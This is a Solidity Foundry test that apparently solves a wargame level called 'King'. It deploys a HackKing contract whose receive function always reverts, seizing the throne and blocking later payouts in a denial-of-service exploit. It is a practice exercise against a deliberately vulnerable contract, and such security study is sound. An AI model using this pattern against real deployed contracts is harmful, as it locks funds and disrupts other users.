// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/King.sol";

contract KingTest is Test{
    King instanceking;

    address player = mkaddr("player");

    function setUp() public {
        instanceking = new King{value: 1 ether}();
        vm.deal(address(this), 1 ether);
    }

    function testKing() public {
        vm.startPrank(player);
        vm.deal(player, 2 ether);
        //check current prize
        instanceking.prize();
        instanceking._king();
        //send ether greater than 1 ether
        HackKing hack = new HackKing{value: instanceking.prize() + 1000}(payable(address(instanceking)));
        //assert that player's address is now the new king
        assertEq(instanceking._king(), address(hack));
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }

}

contract HackKing{ 
    constructor(address payable _kingAddresss) payable{
        (bool success, ) = payable(address(_kingAddresss)).call{value: msg.value}("");
        require(success, "Call failed");
    }

    receive() external payable {
        revert ("You can't be king!");
    }
}